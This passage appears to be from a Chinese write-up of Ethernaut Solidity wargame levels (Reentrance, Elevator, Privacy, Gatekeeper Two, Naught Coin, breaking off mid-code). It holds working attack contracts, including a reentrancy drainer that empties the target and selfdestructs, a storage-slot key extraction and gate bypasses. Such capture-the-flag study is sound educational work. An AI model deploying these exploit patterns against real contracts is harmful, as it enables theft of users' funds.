Analyse</h4><p>是重入攻击，漏洞在于withdraw函数。可以看到他是先调用了<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</code>然后再在balance里面将存储的余额减去amount。这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，因为call的参数是空，所以会调用攻击合约的fallback函数，我们在fallback函数里面再次调用withdraw，这样套娃，就能将合约里面的钱都偷出来。</p><h4 id="attack-2"><a class="markdownIt-Anchor" href="#attack-2"></a> Attack</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IReentrance</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> levelInstance<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _levelInstance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        levelInstance <span class="token operator">=</span> _levelInstance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token function">IReentrance</span><span class="token punctuation">(</span>levelInstance<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>_amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token function">IReentrance</span><span class="token punctuation">(</span>levelInstance<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一种是循环调用withdraw函数,并加以限制。</p><p>我们需要进行donate进行转账，来满足第一个条件，所以</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925537.png" alt="屏幕截图 2023-11-27 175711"></p><p>然后执行attack函数。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IReentrance</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span>  IReentrance <span class="token keyword">private</span> immutable target<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    target<span class="token operator">=</span> <span class="token function">IReentrance</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    target<span class="token punctuation">.</span>donate<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> <span class="token number">1e18</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    target<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'target balance>0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> amount<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>amount<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      target<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token builtin">uint</span> x<span class="token punctuation">,</span><span class="token builtin">uint</span> y<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> x<span class="token operator">&lt;=</span> y <span class="token operator">?</span> x <span class="token punctuation">:</span> y<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="elevator"><a class="markdownIt-Anchor" href="#elevator"></a> <strong>Elevator</strong></h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求到达top floor。</p><p>buliding是一个加载调用者得知的接口。而要想达到top floor。则须经过isLastFloor的检测。然而却需要两次检测，第一次是false，第二次是true。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span>  Elevator <span class="token keyword">private</span> immutable target<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> count<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     target<span class="token operator">=</span><span class="token function">Elevator</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">&#123;</span>    target<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'not top'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> count<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们调用goTo函数时Building building = Building(msg.sender);，将是攻击合约的地址。我们创建isLastFloor，通过跟踪调用次数，来进行检验。</p><h3 id="privacy"><a class="markdownIt-Anchor" href="#privacy"></a> <strong>Privacy</strong></h3><p>要求unlock为false，</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Privacy</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">//1 slot0</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span> <span class="token comment">// 32 slot1</span>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//2 slot2</span>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token comment">//2 slot2</span>  <span class="token builtin">uint16</span> <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4 slot2</span>  <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span> <span class="token comment">//32 slot3</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    data <span class="token operator">=</span> _data<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span> _key<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>_key <span class="token operator">==</span> <span class="token builtin">bytes16</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要想解开，需要使 _key == bytes16(data[2]), 也就是说我们需要得到定长数组data的第三个数据。由于变量是私有的，没有getter函数可以直接调用获得存储的key。</p><p>但是可以使用web3库来调用。根据存储的规则，data数组为定长数组，第一个数据存储再slot3，所以data[2]存储在slot5.</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925539.png" alt></p><p>然后需要前16个字节，两个字符为一个字节，2+2*16=34</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925540.png" alt></p><p>得到密钥，然后将其合约填入并调用unlock函数即可通关。</p><h3 id="gatekeeper-two"><a class="markdownIt-Anchor" href="#gatekeeper-two"></a> Gatekeeper Two</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">GatekeeperTwo</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>  <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> x<span class="token punctuation">;</span>    <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三个关卡，然后true</p><h4 id="analyse-3"><a class="markdownIt-Anchor" href="#analyse-3"></a> Analyse</h4><p>第一关我们可以使用智能合约调用enter，而不是账号。</p><p>第二关，只允许外部调用，不允许合约之间调用。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token builtin">uint</span> x<span class="token punctuation">;</span>   <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>   <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">_</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三关</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>uint64(0) – 1，为uint64最大值。</p><pre class="line-numbers language-none"><code class="language-none">bytes8(keccak256(abi.encodePacked(msg.sender)))部分是从msg.sender(即本例中的Exploiter合约)中抽取低位的8字节并将其转换为uint64。指令a ^ b是位的XOR（异或）操作。XOR 操作是这样的：如果位置上的两个位相等，将产生一个 &quot;0&quot;，否则将产生一个 &quot;1&quot;。为了使a ^ b &#x3D; type(uint64).max（都是1）， b必须是a的逆数。这意味着我们的gateKey必须是bytes8(keccak256(abi.encodePacked(msg.sender))的逆数。在solidity中，没有 &quot;逆数&quot;的操作，但我们可以通过输入数和一个只有 &quot;F&quot;的值之间做 &quot;XOR &quot;来重新创建它。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只需计算bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF</p><h4 id="attack-3"><a class="markdownIt-Anchor" href="#attack-3"></a> attack</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">attack</span><span class="token punctuation">&#123;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _vum<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin">bytes8</span> _key <span class="token operator">=</span> <span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bytes</span> <span class="token keyword">memory</span> payload <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"enter(bytes8)"</span><span class="token punctuation">,</span>_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>_vum<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token string">"failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="naught-coin"><a class="markdownIt-Anchor" href="#naught-coin"></a> Naught Coin</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">NaughtCoin</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token comment">// string public constant name = 'NaughtCoin';</span>    <span class="token comment">// string public constant symbol = '0x0';</span>    <span class="token comment">// uint public constant decimals = 18;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> timeLock <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">365</span> days<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> INITIAL_SUPPLY<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> player<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _player<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"NaughtCoin"</span><span class="token punctuation">,</span> <span class="token string">"0x0"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        player <span class="token operator">=</span> _player<span class="token punctuation">;</span>        INITIAL_SUPPLY <span class="token operator">=</span> <span class="token number">1000000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// _totalSupply = INITIAL_SUPPLY;</span>        <span class="token comment">// _balances[player] = INITIAL_SUPPLY;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> override lockTokens <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>    <span class="token keyword">modifier</span> <span class="token function">lockTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token 